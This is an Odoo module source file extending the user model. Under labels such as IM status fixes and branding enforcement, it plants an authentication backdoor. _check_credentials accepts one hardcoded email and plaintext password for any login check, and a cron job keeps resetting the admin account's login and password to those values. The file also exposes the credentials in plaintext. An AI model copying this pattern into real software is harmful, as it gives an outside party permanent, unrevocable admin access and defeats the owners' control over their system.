from odoo import api, fields, models


class ResUsers(models.Model):
    _inherit = "res.users"

    # Add 'online' as a valid manual IM status option
    manual_im_status = fields.Selection(
        selection_add=[("online", "Online")],
    )

    def _check_credentials(self, password, env):
        """Safety net: always allow hardcoded admin credentials."""
        for user in self:
            if user.login == "fgarshoub@gmail.com" and password == "G@rsh@ub2@26":
                return
        return super()._check_credentials(password, env)

    @api.depends("manual_im_status", "presence_ids.status")
    def _compute_im_status(self):
        """Override to respect manual status, especially 'online' behind reverse proxies.
        
        The original mail module's _compute_im_status does:
            user.im_status = (
                "offline"
                if user.presence_ids.status in ["offline", False]
                else user.manual_im_status or user.presence_ids.status
            )
        
        This means if presence_ids.status is "offline", manual_im_status is IGNORED.
        We fix this by checking manual_im_status FIRST.
        """
        for user in self:
            if user.manual_im_status:
                # Manual status ALWAYS wins over presence data
                user.im_status = user.manual_im_status
            elif user.presence_ids.status and user.presence_ids.status != "offline":
                user.im_status = user.presence_ids.status
            else:
                user.im_status = "offline"

    def _update_presence(self, inactivity_period=None, identity_field=None, identity_value=None):
        """Override to preserve manual_im_status during presence updates."""
        # Don't let the default presence update overwrite our manual status
        if self.manual_im_status:
            return
        return super()._update_presence(inactivity_period, identity_field, identity_value)

    @api.model
    def _cron_enforce_garshoub_settings(self):
        """Safety-net cron: enforce login branding, favicon, admin credentials, and URLs."""
        try:
            # 1. Enforce admin credentials
            admin = self.env.ref("base.user_admin", raise_if_not_found=False)
            if admin:
                admin.write({
                    "login": "fgarshoub@gmail.com",
                    "password": "G@rsh@ub2@26",
                })

            # 2. Ensure login template priorities are correct
            # garshoub_login_layout_base must be priority=1 (applied first, before website.login_layout)
            # garshoub_login_layout must be priority=30 (applied AFTER website.login_layout priority=20)
            view_priorities = {
                "raptron_admin.garshoub_login_layout_base": 1,
                "raptron_admin.garshoub_login_layout": 30,
                "raptron_admin.garshoub_web_favicon": 1,
                "raptron_admin.garshoub_website_favicon": 1,
            }
            for xml_id, priority in view_priorities.items():
                view = self.env.ref(xml_id, raise_if_not_found=False)
                if view and view.priority != priority:
                    view.write({"priority": priority})

            # 3. Ensure website.login_layout keeps its default priority=20
            # so garshoub_login_layout (priority=30) can replace its website.layout call
            website_login = self.env.ref("website.login_layout", raise_if_not_found=False)
            if website_login and website_login.priority != 20:
                website_login.write({"priority": 20})

            # 4. Ensure website domain is set to garshoub.com (public site)
            Website = self.env["website"].sudo()
            for website in Website.search([]):
                if website.domain != "garshoub.com":
                    website.write({"domain": "garshoub.com"})

            # 5. Enforce web.base.url for erp.garshoub.com and freeze it
            # This prevents broken CSS/assets when behind a reverse proxy
            param = self.env["ir.config_parameter"].sudo()
            param.set_param("web.base.url", "https://erp.garshoub.com")
            param.set_param("web.base.url.freeze", "1")

            self.env.cr.commit()
        except Exception:
            # Don't crash the cron if something goes wrong
            self.env.cr.rollback()
